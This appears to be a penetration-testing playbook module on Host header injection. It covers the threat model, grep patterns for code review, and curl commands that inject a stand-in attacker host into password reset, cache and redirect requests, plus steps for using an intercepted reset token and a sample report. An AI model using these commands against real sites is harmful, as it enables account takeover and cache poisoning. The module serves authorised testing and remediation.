# VULN MODULE — Host Header Injection
# Asset: webapp
# CWE-284 | Report prefix: WEB-HOST

## THREAT MODEL

Web applications frequently use the HTTP Host header to construct absolute URLs
in emails, redirects, and cached responses. When the Host header is trusted
without validation, an attacker who controls a request (or intercepts one) can
inject an arbitrary value, causing the server to generate URLs pointing to the
attacker's domain.

Primary attack vectors:
- Password reset poisoning: victim receives reset link to attacker-controlled domain
- Cache poisoning: server caches a response keyed by Host; other users receive it
- SSRF via internal routing: reverse proxy uses Host to select backend
- Open redirect: Location header constructed from injected Host value
- X-Forwarded-Host / X-Host / Forwarded header injection when app trusts proxy headers

Attack requirements:
  1. Application uses Host header (or override headers) to build URLs
  2. No allowlist validation of acceptable Host values
  3. For cache poisoning: caching layer includes Host in the cache key
     (or does NOT — if Host is excluded, injected value reaches app without cache miss)

## VULNERABILITY CLASSES

1. Password Reset Link Poisoning            CWE-284  — reset URL built from untrusted Host
2. Web Cache Poisoning via Host             CWE-601  — cached response contains injected Host URL
3. Open Redirect via Host Header            CWE-601  — Location header reflects injected Host
4. SSRF via Host Header Routing            CWE-918  — reverse proxy routes based on Host value
5. X-Forwarded-Host Injection              CWE-284  — app trusts X-Forwarded-Host over real Host
6. X-Host / Forwarded Header Injection     CWE-284  — non-standard proxy headers trusted by app
7. Dangling Markup via Injected Host       CWE-116  — injected URL breaks HTML context in email
8. Virtual Host Brute Force (related)      CWE-200  — different vhosts exposed on same IP

## WHITEBOX STATIC ANALYSIS

```bash
# ── Host header consumption ──────────────────────────────────────────────────
# Python (Django / Flask)
grep -rn "request\.get_host\|request\.META\[.HTTP_HOST.\]\|request\.host\|SERVER_NAME" \
  --include="*.py" -A5
# Flag: value used in string concat / URL construction without validation

# Node.js (Express)
grep -rn "req\.hostname\|req\.headers\[.host.\]\|req\.headers\.host" \
  --include="*.js" --include="*.ts" -A5

# Java (Spring / Servlet)
grep -rn "request\.getHeader.*Host\|HttpContext\.Request\.Host\|getServerName\|UriComponentsBuilder" \
  --include="*.java" -A5

# PHP
grep -rn "\$_SERVER\[.HTTP_HOST.\]\|\$_SERVER\[.SERVER_NAME.\]" --include="*.php" -A5

# Ruby on Rails
grep -rn "request\.host\|request\.base_url\|request\.url\|root_url" --include="*.rb" -A5

# ── Password reset email generation ──────────────────────────────────────────
grep -rn "password.*reset\|reset.*password\|forgot.*password\|send.*reset" \
  --include="*.py" --include="*.rb" --include="*.php" --include="*.java" \
  --include="*.js" --include="*.ts" -A10
# Check: is reset URL constructed with request.host / request.get_host()?

# ── Forwarded / proxy headers ─────────────────────────────────────────────────
grep -rn "X-Forwarded-Host\|X-Host\|X-Forwarded-Server\|Forwarded.*host" \
  --include="*.py" --include="*.rb" --include="*.php" --include="*.java" \
  --include="*.js" --include="*.ts" --include="*.conf" -A5
# If these headers override Host without IP allowlist → injection vector

grep -rn "ALLOWED_HOSTS\|allowed_hosts\|ServerName\|server_name\|host_whitelist\|validateHost" \
  --include="*.py" --include="*.rb" --include="*.php" --include="*.java" \
  --include="*.js" --include="*.ts" --include="*.conf"
# Missing ALLOWED_HOSTS / empty list = no Host validation

# ── Cache key construction ────────────────────────────────────────────────────
grep -rn "cache_key\|CacheKey\|cache\.set\|cache\.get\|Vary.*Host" \
  --include="*.py" --include="*.rb" --include="*.js" --include="*.conf" -A5
# If Host not included in cache key but app uses Host in response → cache poisoning

# ── Nginx / Apache proxy configuration ───────────────────────────────────────
grep -rn "proxy_set_header Host\|ProxyPreserveHost\|X-Forwarded-Host" \
  --include="*.conf" --include="*.nginx" -A3
# proxy_set_header Host $http_host; passes untrusted client Host to backend
# proxy_set_header Host $host;      uses nginx-resolved host (safer)
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Basic Host header injection

```bash
TARGET="https://target.com"
ATTACKER="evil.attacker.com"

# Basic injection
curl -sk -X GET "$TARGET/" \
  -H "Host: $ATTACKER"
# Check: does response body contain attacker.com URLs?
# Check: Location header on redirects?

# Port injection
curl -sk -X GET "$TARGET/" \
  -H "Host: target.com:evil.attacker.com"

# Password reset endpoint (most impactful)
curl -sk -X POST "$TARGET/password/reset" \
  -H "Host: $ATTACKER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim%40target.com"
# Check: does confirmation message reference attacker domain?
# (Check email inbox if you control victim@target.com)
```

### Step 2 — X-Forwarded-Host and override headers

```bash
TARGET="https://target.com"
ATTACKER="evil.attacker.com"

# X-Forwarded-Host (most commonly trusted proxy header)
curl -sk -X POST "$TARGET/password/reset" \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: $ATTACKER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim%40target.com"

# X-Host
curl -sk -X POST "$TARGET/password/reset" \
  -H "Host: target.com" \
  -H "X-Host: $ATTACKER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim%40target.com"

# X-Forwarded-Server
curl -sk -X POST "$TARGET/password/reset" \
  -H "Host: target.com" \
  -H "X-Forwarded-Server: $ATTACKER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim%40target.com"

# Forwarded (RFC 7239)
curl -sk -X POST "$TARGET/password/reset" \
  -H "Host: target.com" \
  -H "Forwarded: host=$ATTACKER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim%40target.com"
```

### Step 3 — Cache poisoning via Host

```bash
# Step 3a: Inject and check if response is cached
curl -sk -X GET "https://target.com/static/js/app.js" \
  -H "Host: evil.attacker.com" \
  -v 2>&1 | grep -iE "x-cache|cf-cache|age|via|location"
# If X-Cache: HIT → response was stored with injected host

# Step 3b: Check if subsequent clean request serves poisoned response
# (Must send from different IP / clean session)
curl -sk -X GET "https://target.com/static/js/app.js" \
  -H "Host: target.com"
# If response contains evil.attacker.com references → cache poisoned

# Step 3c: Try with cache-buster to avoid poisoning prod
curl -sk -X GET "https://target.com/static/js/app.js?cb=$(date +%s)" \
  -H "Host: evil.attacker.com"
```

### Step 4 — SSRF via Host routing

```bash
# Internal service discovery via Host
for host in localhost 127.0.0.1 internal.target.com admin.target.com 10.0.0.1; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://target.com/api/health" \
    -H "Host: $host")
  echo "$host → HTTP $status"
done
# Different status codes may indicate internal routing based on Host
```

### Step 5 — Absolute URL redirect via Host

```bash
# Check if app issues absolute redirects using Host
curl -skI "https://target.com/login" \
  -H "Host: evil.attacker.com" | grep -i location
# Location: http://evil.attacker.com/dashboard → open redirect
```

## DYNAMIC CONFIRMATION

### Confirming Password Reset Link Poisoning

Prerequisites: control an email address registered on the target.

```bash
# 1. Send poisoned reset request
curl -sk -X POST "https://target.com/password/reset" \
  -H "Host: your-collaborator.burpcollaborator.net" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=your-test-account%40target.com"

# 2. Check Burp Collaborator (or https://webhook.site) for incoming HTTP request
# Expected: GET /reset?token=<TOKEN> from target.com mail server or victim browser
# The token in the request proves the reset link pointed to attacker domain

# 3. If token received, use it to complete password reset:
curl -sk -X POST "https://target.com/password/reset/confirm" \
  -H "Host: target.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=<RECEIVED_TOKEN>&new_password=Confirmed123"
```

Confirmation criteria:
1. Collaborator/webhook receives HTTP request containing reset token
2. Token is valid and can be used to reset the victim's password
3. No additional victim interaction beyond clicking the email link required

### Confirming Cache Poisoning

```bash
# 1. Prime cache with injected Host (use unique cache-buster)
BUSTER="test$(date +%s)"
curl -sk "https://target.com/?$BUSTER" \
  -H "Host: evil.attacker.com" \
  -H "Cookie: session=VALID_SESSION" \
  -v 2>&1 | grep -iE "x-cache|poisoned|evil"

# 2. Fetch without injected Host (simulate victim):
curl -sk "https://target.com/?$BUSTER" \
  -H "Host: target.com"
# If evil.attacker.com appears in response body → confirmed
```

## REPORT_BUNDLE FIELDS

```json
{
  "id": "WEB-HOST-001",
  "title": "Host Header Injection enables password reset link poisoning",
  "cwe": 284,
  "severity": "High",
  "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
  "cvss_score": 8.0,
  "endpoint": "POST https://target.com/password/reset",
  "method": "POST",
  "injected_header": "Host: evil.attacker.com",
  "evidence": {
    "request": "POST /password/reset HTTP/1.1\\nHost: evil.attacker.com\\n\\nemail=victim%40target.com",
    "collaborator_hit": "GET /reset?token=abc123 from 203.0.113.5 (target.com mail server)",
    "token_value": "abc123 (valid, used to reset victim password)"
  },
  "impact": "Attacker can intercept password reset tokens for arbitrary accounts by injecting attacker-controlled Host header. Victim account fully compromised on link click.",
  "remediation": "Validate Host header against a strict server-side allowlist (ALLOWED_HOSTS). Do not use request.get_host() or equivalent for URL construction in emails/redirects. Use a hardcoded base URL from server configuration."
}
```

## TRIAGE NOTE

Host header injection with no sensitive URL generation: Informative
Password reset link poisoning (token interceptable): High / Critical
Cache poisoning serving injected content to unauthenticated users: High
SSRF via Host header routing to internal services: High / Critical
Open redirect only (no token, no cache): Low / Medium
X-Forwarded-Host injection only accepted from internal IPs: Informative
